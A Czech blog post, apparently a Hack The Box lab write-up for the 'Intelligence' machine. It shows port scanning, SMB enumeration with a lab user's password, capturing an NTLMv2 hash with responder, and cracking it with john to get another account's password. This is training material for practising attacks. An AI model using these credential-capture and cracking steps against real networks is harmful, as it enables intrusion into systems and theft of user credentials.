---
layout: post
author: Tomáš Matějíček
title: "Intelligence"
date: 2020-12-05
tags: windows linux smb kerberos ldap sudo active-directory
---
[Intelligence](https://www.hackthebox.com/home/machines/profile/357) je stroj z Hack The Box. V postupu se opírám hlavně o AD enumeraci, práci s účty a následnou eskalaci.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: __CENSORED__
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-29 22:49:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-10-29T22:50:46+00:00; +7h03m36s from scanner time.
445/tcp   open  microsoft-ds?
[... výstup zkrácen ...]
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m35s, deviation: 0s, median: 7h03m35s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-10-29T22:50:05
|_  start_date: N/A
```

### Enumerace SMB
Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
`smbmap -H intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -R --depth 1`
```
[+] IP: intelligence.htb:445    Name: unknown
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    InitShutdown
        fr--r--r--                5 Mon Jan  1 00:57:44 1601    lsass
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    scerpc
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-390-0
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    epmapper
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-1c4-0
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    eventlog
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-280-0
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    atsvc
        fr--r--r--                4 Mon Jan  1 00:57:44 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-4ec-0
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-24c-0
        fr--r--r--                1 Mon Jan  1 00:57:44 1601    Winsock2\CatalogChangeListener-24c-1
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    RpcProxy\49691
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    6f2901363fb76a9e
        fr--r--r--                3 Mon Jan  1 00:57:44 1601    RpcProxy\593
[... výstup zkrácen ...]
        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000001.regtrans-ms
        fr--r--r--           524288 Mon Apr 19 02:51:46 2021    NTUSER.DAT{6392777f-a0b5-11eb-ae6e-000c2908ad93}.TMContainer00000000000000000002.regtrans-ms
        fr--r--r--               20 Mon Apr 19 02:51:46 2021    ntuser.ini
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Pictures
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Recent
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Saved Games
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    SendTo
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Start Menu
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Templates
        dw--w--w--                0 Mon Apr 19 02:51:46 2021    Videos
```

### Enumerace SMB (2)
Kontroluji SMB sdílení a hledám data, která mohou obsahovat citlivé informace.
`impacket-smbclient Tiffany.Molina:NewIntelligenceCorpUser9876@intelligence.htb`

### Získání user flagu
Tímto potvrzuji úspěšný uživatelský přístup.
`cat user.txt`
```
__CENSORED__
```

### Eskalace oprávnění
Tento krok převádí nalezenou slabinu do privilegovaného přístupu.
`sudo responder -I tun0 -A`
```
=> [HTTP] NTLMv2 Hash     : __CENSORED__
```

### Lámání hesel nebo hashů
Pokud mám hash nebo šifrovaný soubor, slovníkový útok může odemknout další krok útoku.
`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt`
```
=> Mr.Teddy         (Ted.Graves)
```

### Získání root flagu
Tímto potvrzuji úplné ovládnutí stroje.
`cat root.txt`
```
__CENSORED__
```
